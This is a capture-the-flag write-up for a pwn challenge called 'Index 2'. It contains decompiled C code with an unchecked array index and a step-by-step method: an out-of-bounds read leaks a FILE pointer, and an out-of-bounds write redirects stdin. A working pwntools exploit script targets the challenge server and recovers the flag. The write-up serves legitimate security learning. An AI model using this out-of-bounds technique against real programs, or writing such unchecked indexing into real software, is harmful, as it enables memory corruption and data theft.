# Index 2

Co-authors: @Rosayxy

```
This time, you get the file pointer, not the flag itself.
```

Decompiled code via Ghidra:

```c
undefined8 main(undefined8 *param_1)
{
  int iVar1;
  long in_FS_OFFSET;
  char local_78 [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  init(param_1);
  do {
    while( true ) {
      menu();
      fgets(local_78,100,stdin);
      iVar1 = atoi(local_78);
      if (iVar1 < 5) break;
      if (iVar1 == 0x539) {
        f = fopen("flag.txt","r");
      }
    }
    switch(iVar1) {
    case 0:
      printf("Invalid choice: %s",local_78);
      break;
    case 1:
      store_data();
      break;
    case 2:
      read_data();
      break;
    case 3:
      print_flag();
      break;
    case 4:
      puts("Bye!");
      if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
        return 0;
      }
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
  } while( true );
}


void read_data(void)
{
  int local_c;
  
  printf("Index: ");
  __isoc99_scanf(&DAT_00102041,&local_c);
  getchar();
  printf("Data: %s",nums + (long)local_c * 8);
  return;
}


void store_data(void)
{
  long in_FS_OFFSET;
  int local_1c [3];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Index: ");
  __isoc99_scanf(&DAT_00102041,local_1c);
  getchar();
  printf("Data: ");
  fgets(nums + (long)local_1c[0] * 8,8,stdin);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Steps:

1. open `flag.txt` and save `FILE *` to f variable
2. use out of bounds read to read `f` in `read_data`: `flag` is at 0x1040a0, `nums` is at 0x104060, so index is `(0x1040a0-0x104060)/8=8`
3. override stdin to `f`: `nums` is at 0x104060, `stdin` is at 0x104030, so index is `(0x104030-0x104060)/8=-6`
4. then the program finds data read from stdin invalid in `fgets(local_78,100,stdin);iVar1 = atoi(local_78);`, and prints out its content via `printf("Invalid choice: %s",local_78);`
5. get flag

Code:

```python
from pwn import *
elf = ELF("./index-2")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch='amd64', os='linux', log_level='debug')

p = remote("play.scriptsorcerers.xyz", 10022)
#p = process("./ld-linux-x86-64.so.2 ./index-2", shell="True")
p.sendline("1337")
p.sendline("2")
p.recvuntil("Index")
p.sendline("8")
# get f addr
data = p.recvline()
addr = data.split()[2][:-2]
print(data, addr.hex())
# point stdin to f
p.sendline("1")
p.recvuntil("Index")
p.sendline("-6")
p.recvuntil("Data")
p.sendline(addr+b"\x00"*2)
p.interactive()
```

Get flag:

```
Invalid choice: scriptCTF{4rr4y_OOB_l3v3l_up!_a1cfd21b2bbd}
1. Store data
2. Read data
3. Print flag
4. Exit
```

Credits to @Rosayxy.
